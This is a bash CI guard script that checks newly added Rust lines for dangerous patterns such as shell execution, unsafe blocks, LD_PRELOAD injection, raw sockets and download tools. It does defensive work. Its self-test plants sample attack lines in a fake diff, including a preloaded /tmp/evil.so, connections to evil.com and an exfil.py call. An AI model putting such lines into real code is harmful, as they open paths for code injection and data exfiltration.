#!/usr/bin/env bash
set -euo pipefail

# check-security-patterns.sh — CI guard: new code must not introduce dangerous patterns
#
# Scans only ADDED lines in the diff — never flags pre-existing code.
# This avoids false positives on runner.rs which already uses Command::new("sh") (issue #640).
#
# Usage:
#   bash scripts/check-security-patterns.sh [BASE_BRANCH]
#   bash scripts/check-security-patterns.sh --self-test
#
# BASE_BRANCH defaults to origin/develop

HARD_FAIL=0

if [ "${1:-}" = "--self-test" ]; then
    # Self-test: inject all known-bad patterns into a fake diff and verify each is detected
    TMPDIR_SELF=$(mktemp -d)
    trap 'rm -rf "$TMPDIR_SELF"' EXIT

    FAKE_DIFF="$TMPDIR_SELF/fake.diff"
    cat > "$FAKE_DIFF" <<'DIFF'
+    let output = Command::new("sh").args(["-c", cmd]).output()?;
+    unsafe { std::ptr::null::<u8>(); }
+    std::env::set_var("LD_PRELOAD", "/tmp/evil.so");
+    let _s = TcpStream::connect("evil.com:443")?;
+    let _r = reqwest::get("http://evil.com").await?;
+    Command::new("python3").arg("exfil.py").output()?;
DIFF

    ADDED=$(grep '^+' "$FAKE_DIFF" | grep -v '^+++' || true)

    PASS=1
    check() {
        local name="$1" pattern="$2"
        if echo "$ADDED" | grep -qE "$pattern"; then
            echo "  ok  $name"
        else
            echo "  MISS  $name — pattern not detected: $pattern"
            PASS=0
        fi
    }

    check "shell execution"        'Command::new\("(sh|bash|cmd)"\)'
    check "unsafe block"           'unsafe\s*\{'
    check "LD_PRELOAD injection"   '\.env\("LD_(PRELOAD|LIBRARY_PATH)"|\bLD_PRELOAD\b'
    check "raw socket"             'TcpStream::connect|UdpSocket::bind|TcpListener::bind'
    check "reqwest HTTP client"    'reqwest::'
    check "interpreter via Command" 'Command::new\("(curl|wget|python3?|node|perl|ruby|powershell|pwsh)"\)'

    if [ "$PASS" -eq 1 ]; then
        echo "PASS: --self-test all 6 patterns detected correctly"
        exit 0
    else
        echo "FAIL: --self-test broken (see above)"
        exit 1
    fi
fi

BASE_BRANCH="${1:-origin/develop}"

# Extract only added lines from Rust source files (exclude diff header lines starting with +++)
ADDED=$(git diff --unified=0 --diff-filter=AM --no-renames "$BASE_BRANCH"...HEAD \
    -- 'src/**/*.rs' 2>/dev/null \
    | grep '^+' | grep -v '^+++' || true)

if [ -z "$ADDED" ]; then
    echo "check-security-patterns: no Rust additions detected — OK"
    exit 0
fi

echo "check-security-patterns: scanning new Rust lines for dangerous patterns..."
echo ""

# ── HARD FAIL: shell execution ────────────────────────────────────────────────

NEW_SHELL=$(echo "$ADDED" | grep -E 'Command::new\("(sh|bash|cmd)"\)' || true)
if [ -n "$NEW_SHELL" ]; then
    echo "  FAIL  New shell execution (sh/bash/cmd):"
    echo "$NEW_SHELL" | head -5 | sed 's/^/        /'
    echo ""
    echo "        Known injection vector — see issue #640 (C-1)."
    echo "        Use resolved_command() instead. Document rationale if intentional."
    HARD_FAIL=1
fi

# ── HARD FAIL: unsafe blocks ──────────────────────────────────────────────────

NEW_UNSAFE=$(echo "$ADDED" | grep -E 'unsafe\s*\{' || true)
if [ -n "$NEW_UNSAFE" ]; then
    echo "  FAIL  New unsafe block:"
    echo "$NEW_UNSAFE" | head -5 | sed 's/^/        /'
    echo ""
    echo "        RTK currently has zero unsafe blocks. Any addition requires"
    echo "        explicit maintainer review and strong justification."
    HARD_FAIL=1
fi

# ── HARD FAIL: environment / linker injection ─────────────────────────────────

NEW_LD=$(echo "$ADDED" | grep -E '\.env\("LD_(PRELOAD|LIBRARY_PATH)"|\bLD_PRELOAD\b|\bLD_LIBRARY_PATH\b' || true)
if [ -n "$NEW_LD" ]; then
    echo "  FAIL  Dynamic linker variable injection (LD_PRELOAD / LD_LIBRARY_PATH):"
    echo "$NEW_LD" | head -5 | sed 's/^/        /'
    echo ""
    echo "        Preloading arbitrary .so files bypasses all runtime security controls."
    echo "        No legitimate use case exists in a CLI filter proxy."
    HARD_FAIL=1
fi

# ── HARD FAIL: raw network sockets ───────────────────────────────────────────

NEW_SOCKET=$(echo "$ADDED" | grep -E 'TcpStream::connect|UdpSocket::bind|TcpListener::bind' || true)
if [ -n "$NEW_SOCKET" ]; then
    echo "  FAIL  Raw network socket detected:"
    echo "$NEW_SOCKET" | head -5 | sed 's/^/        /'
    echo ""
    echo "        RTK does not open raw sockets. Network calls belong in telemetry.rs only."
    echo "        Use the existing telemetry infrastructure or document the exception."
    HARD_FAIL=1
fi

# ── HARD FAIL: reqwest HTTP client ───────────────────────────────────────────

NEW_REQWEST=$(echo "$ADDED" | grep -E 'reqwest::' || true)
if [ -n "$NEW_REQWEST" ]; then
    echo "  FAIL  reqwest HTTP client usage:"
    echo "$NEW_REQWEST" | head -5 | sed 's/^/        /'
    echo ""
    echo "        No reqwest usage exists in the codebase. HTTP calls must go through"
    echo "        the existing telemetry infrastructure. Adding reqwest also pulls in"
    echo "        an async runtime which breaks RTK's <10ms startup guarantee."
    HARD_FAIL=1
fi

# ── HARD FAIL: interpreters / download tools via Command::new ─────────────────
# Note: resolved_command("curl") is legitimate — this catches Command::new("curl") directly,
# which bypasses the cross-platform path resolution wrapper.

NEW_INTERPRETER=$(echo "$ADDED" | grep -E 'Command::new\("(curl|wget|python3?|node|perl|ruby|powershell|pwsh)"\)' || true)
if [ -n "$NEW_INTERPRETER" ]; then
    echo "  FAIL  Interpreter or download tool via Command::new():"
    echo "$NEW_INTERPRETER" | head -5 | sed 's/^/        /'
    echo ""
    echo "        RTK filter modules use resolved_command(\"tool\") not Command::new(\"tool\")."
    echo "        Direct Command::new with download tools is a common exfiltration vector."
    echo "        If adding a new filter, use resolved_command() instead."
    HARD_FAIL=1
fi

# ── WARN: .unwrap() outside lazy_static ──────────────────────────────────────

NEW_UNWRAP=$(echo "$ADDED" | grep -E '\.unwrap\(\)' | grep -v 'lazy_static\|#\[test\]\|#\[cfg(test)\]' || true)
if [ -n "$NEW_UNWRAP" ]; then
    echo "  WARN  New .unwrap() calls (prefer .context()? — not blocking):"
    echo "$NEW_UNWRAP" | head -5 | sed 's/^/        /'
    echo ""
fi

# ── WARN: file deletion ───────────────────────────────────────────────────────

NEW_REMOVE=$(echo "$ADDED" | grep -E 'remove_file|remove_dir_all' || true)
if [ -n "$NEW_REMOVE" ]; then
    echo "  WARN  New file deletion (expected in hooks/init, surprising in a filter — not blocking):"
    echo "$NEW_REMOVE" | head -5 | sed 's/^/        /'
    echo ""
fi

# ── WARN: writes to sensitive paths ──────────────────────────────────────────

NEW_SENSITIVE=$(echo "$ADDED" | grep -E '\.ssh/|/etc/|\.bashrc|\.zshrc|authorized_keys' || true)
if [ -n "$NEW_SENSITIVE" ]; then
    echo "  WARN  Reference to sensitive system path in new code (not blocking):"
    echo "$NEW_SENSITIVE" | head -5 | sed 's/^/        /'
    echo ""
fi

# ── WARN: PATH manipulation ───────────────────────────────────────────────────

NEW_PATH_MANIP=$(echo "$ADDED" | grep -E '\.env\("PATH"' || true)
if [ -n "$NEW_PATH_MANIP" ]; then
    echo "  WARN  PATH environment variable manipulation (not blocking):"
    echo "$NEW_PATH_MANIP" | head -5 | sed 's/^/        /'
    echo ""
fi

# ── WARN: println! in filter code ────────────────────────────────────────────

NEW_PRINTLN=$(echo "$ADDED" | grep -E 'println!' || true)
if [ -n "$NEW_PRINTLN" ]; then
    echo "  WARN  New println! detected (verify it belongs in a filter output path — not blocking):"
    echo "$NEW_PRINTLN" | head -5 | sed 's/^/        /'
    echo ""
fi

# ── Verdict ───────────────────────────────────────────────────────────────────

if [ "$HARD_FAIL" -ne 0 ]; then
    echo "check-security-patterns: FAILED — dangerous patterns introduced. Fix before merging."
    exit 1
else
    echo "check-security-patterns: no dangerous patterns detected — OK"
fi
